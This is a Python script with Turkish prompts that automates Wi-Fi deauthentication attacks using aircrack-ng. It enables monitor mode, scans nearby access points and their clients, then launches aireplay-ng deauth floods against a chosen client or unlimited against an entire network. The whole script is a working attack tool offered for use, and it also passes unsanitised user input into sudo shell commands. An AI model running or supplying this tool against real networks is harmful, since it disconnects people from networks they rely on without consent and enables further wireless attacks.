#!/usr/bin/env python3

import subprocess
import time
import csv
import os
from pathlib import Path
import sys
import platform


def clear_screen():
        if platform.system() == "Windows":
                os.system("cls")
        else:
                os.system("clear")


print("""🟦🟦🟦🟦🟦⬛⬛⬛⬛⬛🟦🟦🟦🟦🟦
🟦🟦🟦⬛⬛🟨🟨🟨🟨🟨⬛⬛🟦🟦🟦
🟦🟦⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨⬛🟦🟦
🟦⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨⬛🟦
🟦⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨⬛🟦
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛🟨⬛⬛⬜⬜⬛⬛⬛⬛⬜⬜⬛🟨⬛
⬛🟨⬛⬛⬜⬛⬛🟨⬛⬛⬜⬛⬛🟨⬛
⬛🟨🟨⬛⬛⬛🟨🟨🟨⬛⬛⬛🟨🟨⬛
⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨⬛
🟦⬛🟨🟨🟨🟨🟨🟨🟨🟨⬛🟨🟨⬛🟦
🟦⬛🟨🟨🟨⬛⬛⬛⬛⬛🟨🟨🟨⬛🟦
🟦🟦⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨⬛🟦🟦
🟦🟦🟦⬛⬛🟨🟨🟨🟨🟨⬛⬛🟦🟦🟦
🟦🟦🟦🟦🟦⬛⬛⬛⬛⬛🟦🟦🟦🟦🟦""")

input("Başlamak için enter tuşuna basınız")

clear_screen()

print("Program Başlatıldı.")


INTERFACE = "wlan0"
MON_IFACE = INTERFACE + "mon"
CSV_PREFIX = "scan_capture"

def run_command_in_xterm(command, title):
    """xterm penceresinde komut çalıştır."""
    full_cmd = ["xterm", "-e", "bash", "-c", f"exec sudo {command}"]
    print(f"[*] '{title}' başlıklı yeni bir xterm penceresinde işlem başlatıldı.")
    return subprocess.Popen(full_cmd)

def enable_monitor_mode():
    print(f"[+] Monitor moda alma: airmon-ng start {INTERFACE}")
    subprocess.run(["sudo", "airmon-ng", "start", INTERFACE])
    print("[+] Monitor moda alındı.")

def disable_monitor_mode():
    print(f"\n[Son] '{MON_IFACE}' arayüzü yönetici moduna geri alınıyor...")
    subprocess.run(["sudo", "airmon-ng", "stop", MON_IFACE])
    print("[+] Monitor modu kapatıldı.")

def get_latest_csv(prefix=CSV_PREFIX, timeout=10):
    deadline = time.time() + timeout
    while time.time() < deadline:
        files = list(Path(".").glob(f"{prefix}*.csv"))
        if files:
            latest = max(files, key=os.path.getmtime)
            return latest
        time.sleep(0.5)
    return None

def parse_csv_aps(csv_file):
    aps = []
    if not csv_file:
        return aps
    with open(csv_file, newline="", encoding="utf-8", errors="replace") as f:
        reader = csv.reader(f)
        for row in reader:
            if not row:
                continue
            if row[0].strip() == "Station MAC":
                break
            first_col = row[0].strip()
            if len(first_col.split(":")) == 6 and len(first_col) == 17:
                bssid = first_col
                channel = row[3].strip() if len(row) > 3 else "N/A"
                if len(row) >= 14:
                    essid = ",".join(row[13:]).strip().strip('"')
                else:
                    essid = row[-1].strip().strip('"')
                if not essid:
                    essid = "<Gizli Ağ>"
                aps.append({"bssid": bssid, "channel": channel, "essid": essid})
    return aps

def list_aps(aps):
    print("\nBulunan Ağlar:")
    for i, ap in enumerate(aps, 1):
        print(f"{i}. BSSID: {ap['bssid']}  CH: {ap['channel']}  ESSID: {ap['essid']}")

def select_aps(aps):
    while True:
        sel = input("\nSeçmek istediğiniz ağ numaralarını virgülle ayırarak girin: ").strip()
        if not sel:
            print("İşlem iptal edildi.")
            return []
        try:
            nums = [int(x.strip()) for x in sel.split(",")]
            selected = [aps[n-1] for n in nums if 1 <= n <= len(aps)]
            if selected:
                return selected
            else:
                print("Geçersiz seçim, tekrar deneyin.")
        except (ValueError, IndexError):
            print("Geçersiz giriş, lütfen listeden numara seçin.")

def get_clients_of_ap(csv_path, ap_bssid):
    clients = []
    if not csv_path or not Path(csv_path).exists():
        return clients
    with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
        reader = csv.reader(f)
        section = 'aps'
        for row in reader:
            if not row:
                continue
            if row[0].strip() == "Station MAC":
                section = 'clients'
                continue
            if section == 'clients':
                client_mac = row[0].strip()
                if len(client_mac.split(":")) != 6:
                    continue
                connected_ap_bssid = row[5].strip() if len(row) > 5 else "(not associated)"
                probed = ",".join(row[6:]).strip().strip('"') if len(row) > 6 else ""
                clients.append({"mac": client_mac, "bssid": connected_ap_bssid, "probed": probed})
    return [c for c in clients if c['bssid'] == ap_bssid]

def safe_input(prompt):
    try:
        return input(prompt)
    except KeyboardInterrupt:
        # Ctrl+C yakalandığında kullanıcının ne yapmak istediğini sor
        print("\n[!] Ctrl+C algılandı, script kapanmasın mı? (e/h)")
        answer = input("Cevap (e/h): ").strip().lower()
        if answer == "e":
            print("[*] Script kapanıyor...")
            disable_monitor_mode()
            sys.exit(0)
        else:
            print("[*] Devam ediliyor...")
            return ""

def run_scan_once():
    """
    Tek bir airodump-ng tarama + seçim + saldırı döngüsünü çalıştırır.
    Döndürülen değer: True -> tekrar tarama, False -> çıkış
    """
    print("[+] Tüm ağlar taranıyor. Açılan pencerede Ctrl+C ile taramayı durdurun.")
    airodump_cmd = f"airodump-ng --write-interval 1 --output-format csv --write {CSV_PREFIX} {MON_IFACE}"
    proc = run_command_in_xterm(airodump_cmd, "Ağ Taraması")

    try:
        proc.wait()
    except KeyboardInterrupt:
        print("\n[Ana] Ctrl+C alındı — ağ tarama penceresi kapatılıyor...")
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            proc.kill()
            proc.wait()

    print("[*] Airodump kapandı, CSV dosyası aranıyor...")
    csv_file = get_latest_csv(prefix=CSV_PREFIX, timeout=8)
    if not csv_file:
        print("[!] CSV bulunamadı, tarama başarısız veya zaman aşımı.")
        return ask_repeat_or_exit()

    aps = parse_csv_aps(csv_file)
    if not aps:
        print("[-] Hiç ağ bulunamadı veya CSV formatı beklenen formatta değil.")
        return ask_repeat_or_exit()

    list_aps(aps)
    selected_aps = select_aps(aps)
    if not selected_aps:
        return ask_repeat_or_exit()

    for ap in selected_aps:
        print(f"\n--- {ap['essid']} ({ap['bssid']}) için istemci taraması başlatılıyor ---")
        client_scan_cmd = f"airodump-ng --bssid {ap['bssid']} --channel {ap['channel']} --output-format csv --write {ap['bssid'].replace(':','_')}_client_scan {MON_IFACE}"
        client_proc = run_command_in_xterm(client_scan_cmd, f"İstemci Taraması: {ap['essid']}")

        try:
            client_proc.wait()
        except KeyboardInterrupt:
            print("\n[Ana] Ctrl+C alındı — client tarama penceresi kapatılıyor...")
            try:
                client_proc.terminate()
                client_proc.wait(timeout=3)
            except Exception:
                client_proc.kill()
                client_proc.wait()

        client_csv_prefix = f"{ap['bssid'].replace(':','_')}_client_scan"
        client_csv = get_latest_csv(prefix=client_csv_prefix, timeout=6)
        if not client_csv:
            print("[!] Client CSV bulunamadı; atlanıyor.")
            continue

        clients = get_clients_of_ap(client_csv, ap['bssid'])
        if not clients:
            print("[*] Bu ağa ait client bulunamadı.")
        else:
            print(f"[*] {len(clients)} client bulundu:")
            for i, c in enumerate(clients, 1):
                print(f"  {i}. {c['mac']}  (BSSID: {c['bssid']})  Probed: {c['probed']}")

            while True:
                choice = safe_input("1) Belirli client'a\n2) Tüm ağa sınırsız\nSeçiminiz (1/2): ").strip()
                if choice == "1":
                    idx = safe_input("Saldırı yapılacak client numarasını girin: ").strip()
                    try:
                        client_to = clients[int(idx) - 1]
                        packet_count = safe_input("Gönderilecek paket sayısı: ").strip()
                        attack_cmd = f"aireplay-ng --deauth {packet_count} -a {ap['bssid']} -c {client_to['mac']} {MON_IFACE}"
                        print(f"[*] Saldırı xterm’de başlatılıyor: {attack_cmd}")
                        subprocess.Popen(["xterm", "-e", "bash", "-c", f"exec sudo {attack_cmd}"])
                        break
                    except Exception:
                        print("Geçersiz seçim; tekrar deneyin.")
                elif choice == "2":
                    attack_cmd = f"aireplay-ng -0 0 -a {ap['bssid']} {MON_IFACE}"
                    print(f"[*] Tüm ağa saldırı xterm’de başlatılıyor: {attack_cmd}")
                    subprocess.Popen(["xterm", "-e", "bash", "-c", f"exec sudo {attack_cmd}"])
                    break
                else:
                    print("Geçersiz seçim; tekrar deneyin.")

    # Tarama ve saldırılar tamamlandı — kullanıcıya ne yapmak istediğini sor
    return ask_repeat_or_exit()

def ask_repeat_or_exit():
    """Kullanıcıya tekrar tarama mı (1) yoksa çıkış mı (2) sorar. True=tekrar, False=çıkış"""
    while True:
        ans = safe_input("\n1) Tekrar airodump taraması yap\n2) Çıkış ve monitor modunu kapat\nSeçiminiz (1/2): ").strip()
        if ans == "1":
            print("[*] Tekrar tarama seçildi.")
            return True
        elif ans == "2":
            print("[*] Çıkış seçildi; monitor modu kapatılacak.")
            return False
        else:
            print("Geçersiz seçim; lütfen 1 veya 2 girin.")

def main():
    if os.geteuid() != 0:
        print("Bu script'i root olarak çalıştırın: sudo python3 script.py")
        return

    try:
        enable_monitor_mode()

        # Ana döngü: kullanıcı tekrar tarama seçeneği seçtiği sürece run_scan_once() çağrılır
        while True:
            repeat = run_scan_once()
            if repeat:
                # döngü devam eder -> tekrar airodump başlatılacak
                continue
            else:
                # çıkış seçildi -> monitör modu kapat ve bitir
                disable_monitor_mode()
                print("[*] Çıkış yapıldı.")
                break

    except KeyboardInterrupt:
        # Ana Ctrl+C yakalandığında kullanıcıya sor ve güvenli kapat
        print("\n[Ana] Ctrl+C algılandı.")
        if ask_repeat_or_exit() is False:
            disable_monitor_mode()
            print("[*] Kapatıldı.")
        else:
            # kullanıcı tekrar tarama seçti ise döngüye dön
            main()  # dikkat: küçük risk, fakat pratikte kullanıcı tekrar tarama isterse yeniden başlat
    except Exception as e:
        print(f"[!] Beklenmedik hata: {e}")
        try:
            disable_monitor_mode()
        except Exception:
            pass
        sys.exit(1)

if __name__ == "__main__":
    main()
